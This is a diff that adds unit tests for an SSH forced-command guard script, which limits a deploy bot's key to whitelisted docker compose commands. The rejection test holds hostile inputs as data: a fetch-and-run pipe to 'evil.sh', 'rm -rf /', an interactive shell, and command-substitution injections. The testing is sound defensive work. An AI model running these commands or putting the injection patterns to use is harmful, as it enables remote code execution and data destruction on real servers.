@@ -577,5 +577,56 @@ class RemoteSetupScriptTest(unittest.TestCase):
         self.assertEqual(len([ln for ln in content.splitlines() if ln.strip()]), 2)
 
 
+class GuardScriptTest(unittest.TestCase):
+    """真的用 sh 跑一遍守卫：这是远端那把 key 的唯一闸门，白名单少一条就是线上事故。
+
+    bot 侧新增命令（例如 v1.5.8 的 `compose stop`）必须同步加进守卫，否则远端 126。
+    """
+
+    def _guard(self, cmd: str) -> int:
+        shell = shutil.which("sh")
+        if shell is None:  # pragma: no cover - POSIX 环境一定有
+            self.skipTest("没有 sh")
+        env = dict(os.environ, SSH_ORIGINAL_COMMAND=cmd, PATH="/nonexistent")
+        proc = subprocess.run([shell, str(GUARD)], env=env, capture_output=True, text=True)
+        return proc.returncode
+
+    def test_bot_commands_are_all_allowed(self):
+        """放行 = 没被 case 拒（后续 exec 找不到 docker 与我们无关）。"""
+        for cmd in (
+            "docker compose version",
+            "docker compose ls -a --format json",
+            "docker compose -f /opt/blog/docker-compose.yml pull",
+            "docker compose -f /opt/blog/docker-compose.yml up -d",
+            "docker compose -f /opt/blog/docker-compose.yml stop",
+            "docker compose -f /opt/blog/docker-compose.yml stop nginx",
+            "docker-compose -f /opt/blog/docker-compose.yml stop",
+            "docker compose -f /opt/blog/docker-compose.yml config --services",
+            "docker compose -f '/opt/my blog/docker-compose.yml' up -d",
+            "docker ps --format json",
+            "docker image ls --no-trunc --format x",
+            "docker inspect --format {{.Id}} abc",
+            "docker image prune -f",
+        ):
+            self.assertNotEqual(self._guard(cmd), 126, "被误拒：%s" % cmd)
+
+    def test_dangerous_commands_are_rejected(self):
+        for cmd in (
+            "bash -i",
+            "docker run --rm alpine sh",
+            "docker exec -it x sh",
+            "docker stop abc",
+            "docker compose -f /x/d.yml down",
+            "docker compose -f /x/d.yml rm -f",
+            'printf %s "$HOME"',
+            # 命令链：白名单模式都以 * 结尾，光靠子命令匹配会把后半截一起放行
+            "docker compose -f /x/d.yml stop; curl evil.sh | sh",
+            "docker compose -f /x/d.yml pull && rm -rf /",
+            "docker compose -f /x/d.yml pull $(curl evil)",
+            "docker compose -f /x/d.yml pull `curl evil`",
+        ):
+            self.assertEqual(self._guard(cmd), 126, "被误放行：%s" % cmd)
+
+
 if __name__ == "__main__":
     unittest.main()
